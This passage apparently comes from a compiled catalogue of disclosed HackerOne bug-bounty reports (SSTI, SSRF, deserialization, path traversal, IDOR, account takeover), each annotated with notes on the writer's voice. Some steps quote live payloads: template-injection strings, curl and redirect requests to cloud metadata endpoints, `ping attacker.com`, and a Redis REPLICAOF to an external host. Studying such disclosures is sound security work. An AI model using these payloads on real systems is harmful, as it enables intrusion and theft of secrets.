> **comment:** Wow, thanks a lot for the bounty and bonus :) Happy to retest when you're ready. :)

### 49. mehqq — Off-by-one memory corruption -> Remote Code Execution (Exim, CVE-2018-6789) (report 322935)

https://hackerone.com/reports/322935

Voice: pronoun I; em-dash no; contractions no. Grammatical quirks like "can be leverage" and "I wonder if this finding worths a bounty" mark clearly non-native English from a technically sharp researcher.

> **title:** Exim off-by-one RCE vulnerability

> **summary:** I found an off-by-one in Exim MTA utility function. It was reported to exim and official patch has been released, assigned CVE-2018-6789. This bug affects all versions of exim.

> **rootcause:** This bug is simple, but can be leverage to gain remote code execution, using skillful heap exploitation. Details are here: https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/

> **other:** I believe exim is widespread enough and it seems to fit all criteria. I wonder if this finding worths a bounty, or the reason why it is not included. Thanks!

> **impact:** Pre-auth remote code execution on all versions of exim mail server

> **comment:** Apologies for the delay and thank you for your report! I have sent a note to the IBB panel to discuss if this will qualify for a bounty or not, as soon as we have come to a conclusion I will provide you with an update here.

> **comment:** Thanks for your reply! Any update currently?

> **comment:** Thank you for helping keep the Internet safe!

### 50. ooooooo_q — SSTI (ERB, Rails UJS test server) -> Remote Code Execution (report 942103)

https://hackerone.com/reports/942103

Voice: pronoun I; em-dash no; contractions yes. Playful proof-of-concept payload that literally creates a file named "me" via `touch me`, paired with an unusually modest, accurate self-assessment of impact.

> **title:** Server-side template injection at ujs test server

> **summary:** I have found in the server code for testing ujs in Rails that template injection is possible and that leads to rce.

> **rootcause:** render inline: params[:content] receives the request value directly and can be executed as ERB code as it is, so it becomes template injection.

> **steps:** encodeURIComponent("<% `touch me` %>") > "%3C%25%20%60touch%20me%60%20%25%3E"

> **steps:** ❯ ls me me

> **impact:** Since the attack code can be sent as a GET request, an attacker can attack a device running a test server for ujs from the external network by inducing a trap site. However, since this is a server used for testing rails development, it does not seem to have a significant impact on users.

> **comment:** I think we should probably just fix this in the development branch and back port it. Can you make a patch for this? If not, I can try to come up with one.

> **comment:** I created a patch. (XSS still exists for this fix, but I decided it wasn't a high priority.)

> **comment:** Thank you for the report. We've deployed a fix for this issue here. For this reason, we'll close this report as Resolved. Since the issue is in test code, this issue is not eligible for a bounty.

### 51. zerohex — SSTI (lodash _.template) -> code execution, CVE-2021-23337 (report 904672)

https://hackerone.com/reports/904672

Voice: pronoun I; em-dash no; contractions yes. An unedited template placeholder — "Hunter's comments and funny memes goes here" — was left inside the submitted report body, alongside genuinely self-deprecating apologies for a bug later proven correct by CVE.

> **title:** Server-side Template Injection in lodash.js

> **summary:** I would like to report Server-side Template Injection in lodash.js (_.template function) It allows the execution of code on the server

> **rootcause:** The _.template function of the lodash package does not properly validate user-supplied input. An application making use of the lodash package may be exploited by an attacker that controls the value of a parameter processed by the _.template function.

> **steps:** Step 3: Visit the vulnerable application and enter a payload such as ${JSON.stringify(process.env)} into the name parameter

> **other:** Hunter's comments and funny memes goes here

> **other:** Apologies if I haven't used the ideal terminology or if this is a duplicate.

> **impact:** Remote code execution

> **comment:** However, as you allude, my POC implementation is likely flawed (due to my inexperience and the indicators pointing towards an issue that is a by-design feature). Sorry for wasting your time on this.

> **comment:** This functionality in Lodash works as expected. Templates should not be built based on untrusted input data.

> **comment:** Hi, just stumbled across CVE-2021-23337 which seems to confirm that this report was valid (https://nvd.nist.gov/vuln/detail/CVE-2021-23337) (https://snyk.io/vuln/SNYK-JS-LODASH-1040724).

### 52. cujanovic — SSRF -> AWS instance metadata disclosure (DuckDuckGo proxy) (report 395521)

https://hackerone.com/reports/395521

Voice: pronoun I; em-dash no; contractions no. The whole vulnerability, exploit, and impact are compressed into roughly two sentences plus a raw curl command — an extreme minimalist style for a Critical-rated SSRF.

> **title:** SSRF vulnerability on proxy.duckduckgo.com (access to metadata server on AWS)

> **summary:** Hello, I saw that SSRF on proxy.duckduckgo.com is out of scope but because of the severity I wanted to report this. The payload is simple: curl "https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/"

> **rootcause:** Response from the server:

> **supporting:** ami-launch-index ami-manifest-path block-device-mapping/ hostname instance-action instance-id instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/

> **impact:** access information on internal AWS metadata server.

> **comment:** Thank you for your submission. I was able to validate your report, and have submitted it to the appropriate team for a thorough evaluation.

> **comment:** Fixed! That endpoint no longer allows access to the EC2 metadata endpoint.

> **comment:** That is incorrect @tim_ddg check ticket #395626 for a working method to still do this

### 53. agarri_fr — SSRF -> EC2/OpenStack instance-metadata disclosure (report 53088)

https://hackerone.com/reports/53088

Voice: pronoun impersonal; em-dash no; contractions yes. Consistent minor spelling errors ('Hoewever', 'deployement') mark a non-native English writer, while the argument itself confidently escalates a vendor's earlier 'Won't fix' dismissal by generalizing it to a whole cloud-metadata bug class.

> **title:** SSRF vulnerability (access to metadata server on EC2 and OpenStack)

> **summary:** In bug [#50537](https://hackerone.com/reports/50537), **haquaman** reported a SSRF vulnerability in the meme creation section of Phabricator.

> **rootcause:** Ticket [T6755](https://secure.phabricator.com/T6755) was created and the HackerOne issue was closed as "Won't fix".

> **rootcause:** *"attackers can use the machine's ability to access the network, which may allow them to find services (and, in some rare cases, interact with services that have very, very weak authentication and act over HTTP GET)"*.

> **supporting:** Hoewever, some common deployement scenarios (using Amazon EC2 or OpenStack) include a "metadata" web server listening on a multicast IP (169.254.169.254):

> **impact:** However, the worst scenario is auto-starting instances, where a startup script is stored in [/latest/user-data](http://169.254.169.254/latest/user-data). These startup scripts may include passwords, private keys, source code, ...

> **steps:** Test URLs: ``` http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/user-data ```

> **other:** Outside of EC2 and OpenStack, some services are commonly bound to localhost, including monitoring software, noSQL databases, administration interfaces, ...

### 54. gammarex — Insecure file-type handling in avatar upload -> Ghostscript/ImageMagick RCE (CVE-2017-8291) (report 365271)

https://hackerone.com/reports/365271

Voice: pronoun impersonal; em-dash no; contractions yes. Uses legacy forum-style slash-delimited italics ('/Proof of concept/', '/Mitigation/') instead of Markdown headers, and drops all first-person narration entirely — reads like a terse lab note rather than a story.

> **title:** Remote code execution on Basecamp.com

> **summary:** A critical flaw in Basecamp's profile image upload function leads to remote command execution.

> **rootcause:** Images are converted on the server side, but not only image files but also PostScript/EPS files are accepted (if renamed to .gif).

> **rootcause:** This is probably due to ImageMagick / GraphicsMagick being used for image conversion, which calls a PostScript interpreter (Ghostscript) if the input file starts with '%!'.

> **rootcause:** The used Ghostscript version however has a security bug (CVE-2017-8291) leading to remote command execution.

> **steps:** /Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).

> **remediation:** /Mitigation/: Upgrade Ghostscript; also, before processing uploaded images make sure they are real image files (e.g. based on magic header)

> **impact:** Gain a remote shell; from here start exploitation/privilege escalation

### 55. nrockhouse — SSRF via redirect-following URL-fetch template variable ('readapi') -> AWS EC2 metadata access (report 1108418)

https://hackerone.com/reports/1108418

Voice: pronoun I; em-dash no; contractions yes. Candidly documents a negative result ('This limits me from being able to escalate this further... but not that I could find') rather than hiding the incomplete escalation — an honestly capped-impact disclosure.

> **title:** SSRF allows reading AWS EC2 metadata using "readapi" variable in Streamlabs Cloudbot

> **summary:** Streamlabs Cloudbot is a customisable chatbot provided by Streamlabs which allows the creation of custom commands along with custom responses.

> **rootcause:** However, the backend checks to see if the supplied URL is using the `https://` protocol. If any other protocol is supplied, including `http://`, the backend simply replaces the variable with `[Https required]`

> **rootcause:** Fortunately, Cloudbot's backend follows redirects, even if it's to an HTTP URL.

> **steps:** I simply hosted a file `slpoc.php` on my server containing the following contents. ```php <?php header('Location: http://169.254.169.254/latest/meta-data/'); ?> ```

> **impact:** As can be seen above, the EC2 instance does not have an IAM role assigned to it. This limits me from being able to escalate this further to file disclosure, RCE, or an AWS account takeover.

> **impact:** Since Cloudbot runs on multiple different EC2 servers for load balancing, there may be potential misconfigured servers that my Cloudbot isn't running on which allows such an escalation, but not that I could find.

> **other:** Attempts on redirecting to other protocols (ex. `gopher://`, `ftp://`, `file://`, `dict://`) have all returned `[Bad Server Response / Too slow]` with nothing hitting my test servers.

> **remediation:** The applied fix no longer follows redirects, the behaviour now is that it would simply throw `[Bad Server Response / Too slow]` for redirects, which should prevent anyone from querying the AWS metadata endpoint, or any HTTP URLs for that matter.

### 56. z32 — Insecure deserialization in Telerik UI RadAsyncUpload (CVE-2017-11317 / CVE-2019-18935) -> RCE (report 1174185)

https://hackerone.com/reports/1174185

Voice: pronoun I; em-dash no; contractions yes. The report was submitted mid-exploitation, not as a polished retrospective: the researcher logs a failed attempt and announces going to sleep, with a self-close threat if it doesn't pan out, right inside the report body.

> **title:** Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)

> **summary:** is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.

> **impact:** An attacker can execute code on the vulnerable server, allowing an attacker to gain a foothold and exfiltrate data. Depending on the security posture of the underlying system, an attacker may be able to escalate privileges or laterally move to other systems within the network using this access.

> **steps:** You should see the following response: ``` { "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." } ```

> **steps:** This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server. The contents of my `testfile.txt` simply included the word "test".

> **steps:** As a .NET application will only load an assembly once with a given name, the dll from my test will only successfully sleep the server on the first exploit.

> **comment:** *Note: I'm having trouble getting the server to sleep with the crafted `.dll`. The files are getting uploaded, but do not seem to be causing the server to sleep as expected. It is 02:30 AM here at the moment so I am heading to bed but will update tomorrow with more info in the comments, and will end up self closing if I can't get execution.*

> **remediation:** Update TelerikUI to the latest (or a patched) version.

### 57. nahamsec — SSRF via image-import feature + DNS rebinding -> GCP instance-metadata / service-account token theft (report 530974)

https://hackerone.com/reports/530974

Voice: pronoun mixed; em-dash no; contractions yes. Opens like a casual message to the team ('Hey there, I was looking at your ads site with @daeken...') rather than a formal disclosure, yet delivers a fully weaponized DNS-rebinding exploit chain reaching GCP metadata token theft.

> **title:** Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

> **summary:** Hey there,  I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app.

> **rootcause:** _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`)

> **steps:** Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)

> **steps:** Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes. ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.

> **impact:** SSH Keys: ``` SSH Keys: "██████" ```

> **other:** @nahamsec, @daeken and @ziot found a Server-Side Request Forgery (SSRF) vulnerability in https://business.snapchat.com which they exploit by providing a custom webpage configured to utilize DNS rebinding to access internal web endpoints like the Google Metadata Service.

### 58. saltyyolk — Path traversal in package registry API -> arbitrary file write -> RCE via SSH key overwrite (report 733072)

https://hackerone.com/reports/733072

Voice: pronoun I; em-dash no; contractions yes. Casually apologizes for testing on a cracked self-hosted GitLab EE license ('Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)') and describes landing an SSH shell as something to 'enjoy' — an unusually candid, low-ceremony tone for a $12,000 RCE.

> **title:** Path traversal, to RCE

> **summary:** A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

> **steps:** Then run `ssh git@10.26.0.5` to enjoy a shell.

> **other:** In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

> **supporting:** Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

> **impact:** This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

### 59. yvvdwf — Sawyer::Resource insecure deserialization (via Octokit GitHub import) -> Redis command injection -> RCE (report 1672388)

https://hackerone.com/reports/1672388

Voice: pronoun I; em-dash no; contractions no. Narrates live-fire testing restraint on gitlab.com production infra in real time — takes over the target's Redis via REPLICAOF, confirms full control, then self-limits: 'I immediately turned off the replication... I think I should stop testing to avoid any further potential incidences.'

> **title:** RCE via github import

> **summary:** While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.

> **rootcause:** Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:

> **steps:** So I used then the basic redis command `REPLICAOF 51.75.74.52 11211 ` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`

> **supporting:** This means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one `.

> **other:** I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`

> **impact:** Any one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses

### 60. kapytein — Python pickle deserialization (Liberapay notifications) chained with SQL injection -> RCE (report 361341)

https://hackerone.com/reports/361341

Voice: pronoun I; em-dash no; contractions yes. Proactively discloses a primitive he admits he can't fully weaponize himself ('I can't directly exploit it due to the restriction on team names') and explicitly offers to escalate it jointly with the vendor rather than withholding it — an unusually collaborative, good-faith framing for an RCE-adjacent bug.

> **title:** Unsafe deserialization in Libera Pay allows to escalate a SQL injection to Remote Command Execution

> **summary:** There isn't a direct vulnerability, however a SQL injection would easily be escalated to a Remote Code Execution. I can't directly exploit it due to the restriction on team names (it does not accept hexdecimal values).

> **other:** I, however, submit this issue in advance and will attempt to escalate this issue further, if possible together with you.

> **rootcause:** which is known to be unsafe. You can basically craft any object, and pickles will happily execute the object.

> **steps:** Log in as the user who is invited to your team, browse to notifications and notices that the sleep command was used (basically, it will hang).

> **impact:** This could allow remote code execution if a SQL injection is escalated.

### 61. odaysec — DotNetNuke DNNPersonalization cookie XML/type deserialization (CVE-2017-9822) -> RCE (report 2762119)

https://hackerone.com/reports/2762119

Voice: pronoun impersonal; em-dash no; contractions no. Structured as an escalation ladder rather than a narrative: a benign win.ini file-read PoC first, then a clearly labeled 'Aggressive Mode' second PoC that swaps in a full ysoserial.net-generated PowerShell reverse-shell payload against the same live endpoint.

> **title:** CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci

> **summary:** DotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE).

> **rootcause:** The expected structure includes a `type` attribute to instruct the server which type of object to create on deserialization.

> **steps:** If everything goes well, following request will return content of win.ini file in response body.

> **steps:** Proof of Concept (PoC) 2: Aggressive Mode (exploit with powershell reverse tcp shell)

> **supporting:** https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/ https://www.exploit-db.com/exploits/48336

> **impact:** DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci

### 62. yaworsk — Server-side template injection (Smarty) via profile fields -> PHP code execution -> RCE (report 164224)

https://hackerone.com/reports/164224

Voice: pronoun I; em-dash no; contractions yes. Signs off with his real first name ('Pete') and a friendly 'Please let me know if you have any questions' — a casual, low-drama close despite the report title itself calling the RCE 'Urgent'.

> **title:** Urgent: Server side template injection via Smarty template allows for RCE

> **summary:** Hi All, I've found an issue which has allowed me to execute file_get_contents and extract your /etc/passwd file.

> **rootcause:** It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed.

> **steps:** To start, I began with the payload {7*7} and received a template error in the email I received {F115749}

> **steps:** Next I was able to test {php} tags by using ```{php}print "Hello"{/php}```

> **impact:** Since the {php} tags are being parsed and executed, we can execute php functions. In this case, you'll see I'm able to extract the etc/passwd file. While I haven't tried, an attacker can more than likely create a shell on the server.

> **comment:** Please let me know if you have any questions. Pete

### 63. root_geek280 — IDOR on HackerOne's own AddTagToAssets GraphQL mutation (report 2633771)

https://hackerone.com/reports/2633771

Voice: pronoun impersonal; em-dash no; contractions no. The disclosed report body itself contains literal redaction bars ('████████████' / '███') where HackerOne withheld PoC video detail even in the public writeup — a visible trace of the platform's own redaction process baked directly into the 'verbatim' text; grammar slips ('a application', 'mount a enumeration attack', 'Successfully to disclose') mark the author as a non-native English writer.

> **title:** IDOR Vulnerability at AddTagToAssets operation name

> **summary:** Insecure Direct Object Reference (called IDOR from here) occurs when a application exposes a reference to an internal implementation object.

> **rootcause:** IDOR bring, depending on the format/pattern in place, a capacity for the attacker to mount a enumeration attack in order to try to probe access to the associated objects.

> **steps:** Bruteforce the AsmTagId then replace to your `tagId` parameter

> **steps:** Successfully to disclose victim's custom tag without any interaction with victim

> **other:** ████████████ _Detail about vulnerability and PoC on the attachment video file below._ ███

> **remediation:** IDOR means that you directly alter a database object by using user submitted data in the query before checking or validating that data.

> **impact:** Lead to disclose all of victim's new custom tags without any interaction with victim.

### 64. moblig — IDOR (Insecure Direct Object Reference) — GitLab ML Model Registry, incremental/guessable model IDs exposing private models (report 2528293)

https://hackerone.com/reports/2528293

Voice: pronoun I; em-dash no; contractions no. Opens with the casual bug-bounty convention 'Hi team,' then drops straight into terse, technical prose with inline screenshot placeholders like '{F3314537}' left un-rendered in the raw text.

> **title:** IDOR Exposes All Machine Learning Models

> **summary:** Hi team, I found an IDOR affecting the Machine Learning Model Registry in Gitlab

> **summary:** This vulnerability allows an attacker to access any Model Registry as well as different versions of the model.

> **rootcause:** Model ID's are also easy to guess as they are incremental, making it easy for an attacker to expose all models

> **steps:** Intercept any response to `/api/graphql` and extract the values of the `cookie`& `X-Csrf-Token` headers

> **steps:** Since the ID is easily guessable, you can decrement the value of the ID in order to access other Models.

> **impact:** Access to all existing models since the ID is incremental. This affects all Gitlab tiers, offerings as well as Gitlab most recent version

> **supporting:** Introduced in GitLab 15.11 as an experiment release with a flag named ml_experiment_tracking. Disabled by default.

### 65. z3phyrus — IDOR (session misbinding) — Mozilla Firefox Accounts /account/destroy lets an attacker delete a victim's account by supplying their email+authPW hash under the attacker's own session (report 3154983)

https://hackerone.com/reports/3154983

Voice: pronoun impersonal; em-dash no; contractions yes. Title uses an en dash ('Session Misbinding – Attacker Can Delete...'), and the body redacts specific victim/attacker session data with solid block characters ('███████') inline in the steps rather than removing the lines.

> **title:** IDOR: Account Deletion via Session Misbinding – Attacker Can Delete Victim Account

> **summary:** A critical vulnerability in the Firefox Accounts API allows an authenticated attacker to permanently delete any user's account

> **rootcause:** The server fails to verify that the session making the request belongs to the account being deleted.

> **steps:** Use Burp Suite to intercept a request to the endpoint https://api.accounts.firefox.com/v1/account/destroy when deleting the account.

> **steps:** Then cancel the request (don't let it reach the server).

> **steps:** The server accepts the request and deletes the victim's account, even if it was from the attacker's session.

> **impact:** **==Allows attackers to delete victim accounts without permission.==**

### 66. bugbountywithmarco — IDOR — Bykea legacy/'zombie' in-app endpoint leaking other users' trip and driver details without ownership validation (report 3085742)

https://hackerone.com/reports/3085742

Voice: pronoun impersonal; em-dash no; contractions no. The report body itself has 'no-content' visibility on HackerOne (redacted from public view), so the only public text is Bykea's own triager-written summary about the researcher, not bugbountywithmarco's own words — a real limitation, not a fabrication.

> **title:** IDOR on in-app hardcoded zombie endpoint

> **summary:** @bugbountywithmarco **discovered an Insecure Direct Object Reference (IDOR) vulnerability in a hardcoded legacy (zombie) endpoint that was no longer actively used but remained accessible.**

> **summary:** By reverse engineering the Android app and reviewing the code for unused endpoints, the researcher identified an exposed API

> **impact:** leaked sensitive details related to drivers involved in other users’ trips, without validating trip ownership.

### 67. bate5a — IDOR — HackerOne's own /bugs.json endpoint let any authenticated user pull private report metadata (title, id, state, severity, reporter) for an arbitrary organization by ID (report 2487889)

https://hackerone.com/reports/2487889

Voice: pronoun I; em-dash no; contractions no. Distinctive non-native capitalization pattern throughout ('I Found', 'Doing Well Today', 'Step To Reproduce') plus a friendly smiley greeting ':)' addressed directly to 'H1' (HackerOne) rather than any formal salutation.

> **title:** Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint

> **summary:** Hi H1 i hope you are Doing Well Today :)

> **summary:** I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint.

> **rootcause:** This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value.

> **steps:** Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is

> **impact:** idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

### 68. hk755a — IDOR (fraud / free-order) — Yelp/Grubhub checkout endpoint let an attacker substitute another user's credit_card_id to pay with their saved card (report 391092)

https://hackerone.com/reports/391092

Voice: pronoun mixed; em-dash no; contractions no. The report body proper is redacted ('no-content' visibility) but the researcher's own disclosure summary survives, written in third person about himself ('the attacker...for himself') with an exclamation-mark sign-off thanking a specific collaborator by handle.

> **title:** I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)

> **comment:** There was an Insecure Direct Object Reference Vulnerability that allowed the attacker to pay from someone else's credit card while purchasing orders (or to be precise, Ordering Food) on yelp

> **comment:** thus making the order's free for himself. The vulnerability had the potential to affect all the credit cards saved on yelp.com (1,500,000+).

> **comment:** Yelp validated and fixed the vulnerability within a few hours, thus showing their concern for user's security!

> **comment:** Special thanks to @Calvinli for sharing credit_card_id which allowed the validation of the bug.

> **other:** @hk755a found an Insecure Direct Object Reference (IDOR) Vulnerability that allowed an attacker to pay with someone else's registered credit card, while ordering food with Grubhub through the `/checkout/transaction_platform` endpoint.

### 69. bugra — IDOR leading to account takeover — Automattic/Atavist email-change endpoint trusted a client-supplied sequential user id parameter, letting anyone change any account's email then reset the password (report 950881)

https://hackerone.com/reports/950881

Voice: pronoun I; em-dash no; contractions yes. Simple, plainly-worded first-person walkthrough (own account -> found id param -> logical leap to 'we can change any user's email') closed with an informal first-name sign-off, 'Thanks,\nBugra', rather than a company-style footer.

> **title:** IDOR when editing email leads to Account Takeover on Atavist

> **summary:** Hi team, I created an account on Atavist and checked my settings page.

> **rootcause:** there is a `id` parameter on request data. It's our user ID, and it's vulnerable for IDOR. So we can change any user's email address.

> **rootcause:** Also user IDs are sequential so an attacker can change all accounts' email.

> **steps:** Now you can reset victim's password via https://magazine.atavist.com/forgot

> **impact:** Account Takeover without user interaction

> **other:** Thanks, Bugra

### 70. db3wy — Account takeover (0-click, password reset) (report 2831902)

https://hackerone.com/reports/2831902

Voice: pronoun mixed; em-dash no; contractions no. All-caps asides and a run of dashes as bullet markers ('1-----Go to...', '4-----Intercept...') give the writeup a hand-typed, unedited feel distinct from a polished template.

> **title:** [CRITICAL] 0-Click Account Takeover via Password Reset [AUTH-3243] /orchestrator/v1/password_reset/start

> **summary:** A 0-click Account Takeover vulnerability was identified in the password reset functionality of the target website.

> **other:** FIRFOX FOR ATTACKER Burp Browser for victim

> **steps:** 1-----Go to the Password Reset Page:

> **steps:** This endpoint may not appear on the first attempt; you may need to repeat the process. As you can see in the recorded video, it appeared for me on the second attempt.

> **steps:** Download a tool for Burp Suite called JSON Web Token. It will make your work easier as it highlights the requests containing the JWT token in green, helping you easily identify the correct endpoint

> **impact:** Additionally, the site allows money transfers, and by exploiting this vulnerability, the attacker can potentially steal funds from victims' accounts.

> **impact:** Potential to Lock Out the Victim: The attacker can change the password and prevent the victim from accessing their own account, leading to a potential denial of service.

### 71. boy_child_ — Account takeover (SCIM provisioning) (report 3178999)

https://hackerone.com/reports/3178999

Voice: pronoun I; em-dash no; contractions yes. Uses rhetorical questions mid-report ('Why?') as a narrative device to walk the reader through their own reasoning, rather than presenting the finding as already-solved.

> **title:** Account takeover of existing HackerOne accounts through SCIM provisioning

> **rootcause:** After numerous attempts and understanding, I was able to take over existing user accounts through SCIM provisioning.

> **rootcause:** Initially, I thought this would automatically be a certain loophole.

> **rootcause:** I then thought this looked too easy, so I assigned the user access to Okta and tried to log in via SSO, but it failed and did not work. Why?

> **steps:** 1. In Okta, create a user whose email I control, say `attacker@verifed.com`

> **steps:** 6. Bingo!

> **supporting:** So the attacker sets a password reset, which also does not send a notification to the user! (issue 3) Rather, the new email is controlled by the attacker.

> **impact:** Why I think this is so critical is that apart from taking over user accounts, take note of EVERY new organisation, sandbox alike, there are two users present by default:

> **comment:** (I tested on an old sandbox I own, wish I didn't delete them.)

### 72. bull — Account takeover (SAML RelayState/CSRF) (report 1923672)

https://hackerone.com/reports/1923672

Voice: pronoun I; em-dash no; contractions yes. Signs off by first name ('thanks / Bull') and lowercases the pronoun 'i' throughout the closing line, giving the report an informal, dashed-off email register despite the technical sophistication of the chained exploit.

> **title:** Account takeover due to insufficient URL validation on RelayState parameter

> **rootcause:** Hi, I have found an issue which can be used by an attacker to steal Bitbucket access token along with Other third party access tokens(google, salesforce etc).

> **rootcause:** there is open redirect while loggin to gitlab Via SAML, while the Open redirect is not much impactful since it is a post based request coming from third party domain, but the redirect happens and is also saved along in the gitlab cookies

> **steps:** Here are my credentials for triage purposes: (Please note i will revoke these credentials upon triage, let me know if you need them longer or dont need them at all)

> **steps:** here is the poc for doing everything step by step, **please note all this can be automated with window.open for 1 click exploit**

> **impact:** Steal bitbucket access token, which can be used to import victim's any repository, and also write access to victim's any wiki in bitbucket, also this can be used to steal access tokens for other providers such as google, salesforce twitter etc.....

> **comment:** Please let me know if you need any more information or if i missed something thanks Bull

### 73. w2w — Account takeover (2FA linking bypass) (report 810880)

https://hackerone.com/reports/810880

Voice: pronoun mixed; em-dash no; contractions yes. Switches between 'I found' in the opening line and 'we are using'/'we can fully takeover' in the technical body, a pronoun drift typical of a non-native writer translating between a personal report voice and a generic instructional voice.

> **summary:** Hello, team! I found 2 vulnerabilities in your 2FA implementation:

> **rootcause:** There is a possibility to link 2FA to any other account if it wasn't set up before and user ID is known on the request /api/2fa.

> **rootcause:** As you can see, in this request, we. don't use tokens/cookie that could be related to the user's ID, we are using only ID a561a2de-b8fe-49f8-8943-fb42229b7b08 and valid code.

> **steps:** 2. Register an account `user2`, register at https://console.helium.com, perform a 2FA request but with ID from `user1`. 2FA is enabled now on the account `user1`!

> **steps:** Result: You've successfully achieved an account takeover. In the future, you'll be able to log in again with this technique in the future, but a victim will have trouble logging in because of 2FA.

> **impact:** If a victim's account ID is known, we can fully takeover an account without user interaction.

### 74. akashhamal0x01 — Account takeover (stale verification token) (report 1114347)

https://hackerone.com/reports/1114347

Voice: pronoun we; em-dash no; contractions no. Uses an arrow-chain ('->') to narrate the causal sequence of the bug instead of numbered steps -- an idiosyncratic, almost diagram-in-prose way of showing state transitions.

> **summary:** HI team, i hope you are good :)

> **summary:** Its a very simple logical flaw that results in this

> **rootcause:** but it is found that even after verifying victim999@gmail.com, the old link which was sent to victim111@gmail.com is active, so user/attacker having access to that mail can verify it and takeover acc

> **rootcause:** the flaw : user changes mail to attacker@gmail.com -> user realizes that he mistyped the mail -> so he again changes to mail he owns and verifies it -> old link sent to attacker@gmail.com is still active even after new mail has been verified

> **rootcause:** It is mandatory for a web app to invalidate the tokens in time to secure its user

> **impact:** An attacker can takeover acc due to misconfiguration, not invalidation of tokens at major state change, in time

## Rejected: non-human / templated / machine-translated

- 1328546 (johnstone) — templated — https://hackerone.com/reports/1328546
- 733267 (gamer7112) — templated — https://hackerone.com/reports/733267
- 1323406 (xfiltrer) — templated — https://hackerone.com/reports/1323406

## Uncertain (accessible, human authorship not confidently established; not counted)

- 391217 (moskowsky) — https://hackerone.com/reports/391217

## Inaccessible (real body could not be fetched)

- 821962 — Direct fetch (curl, multiple user agents, repeated attempts after cooldown) returns HTTP 302 redirect to https://hackerone.com/reports/821962 sign-in wall (Location: https://hackerone.com/users/sign_in). The HackerOne public JSON endpoint (reports/821962.json) returns 404. This report is not viewable without an authenticated HackerOne account, despite appearing on aggregator lists as 'disclosed'. Web search only surfaced a third-party mirror (vulners.com) summarizing it as a Razer OS command injection by s3cr3tsdn (~$2,000 bounty, reported ~March 2020) but that is a one-line aggregator summary, not the report body, so per the hard rules it cannot be used as a verbatim source. — https://hackerone.com/reports/821962
- 885975 — Direct fetch redirects (HTTP 302) to https://hackerone.com/users/sign_in; JSON endpoint returns 404. Web search surfaced a NahamSec personal blog post about an SSRF/WeasyPrint bug on Lyft, but the blog HTML contains no link to hackerone.com/reports/885975 or any report-ID reference, so it cannot be verified as the same report — using it would risk misattributing content to the wrong report ID, which the task rules forbid. — https://hackerone.com/reports/885975
- 868436 — Direct fetch redirects (HTTP 302) to https://hackerone.com/users/sign_in; JSON endpoint returns 404. No independent mirror or writeup with verbatim report text was found via web search. — https://hackerone.com/reports/868436
- 141956 — Direct fetch redirects (HTTP 302) to https://hackerone.com/users/sign_in; JSON endpoint returns 404. No independent mirror or writeup with verbatim report text was found via web search. — https://hackerone.com/reports/141956
- 925585 — The report is listed as disclosed (disclosed_at 2021-02-09) but its underlying JSON (hackerone.com/reports/925585.json) shows visibility="no-content" and is_published=false, and the vulnerability_information field (the reporter alexbirsan's own write-up) is an empty string. The only text present is a short third-person 'team' summary authored by a PayPal-side HackerOne account (username space_pp), e.g. "A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry..." — this is PayPal's paraphrase of the finding, not the researcher's verbatim report body, so it does not satisfy the verbatim-quote / real-disclosed-body requirement. Marking inaccessible rather than fabricating or substituting the team paraphrase as if it were the hacker's own writeup. — https://hackerone.com/reports/925585
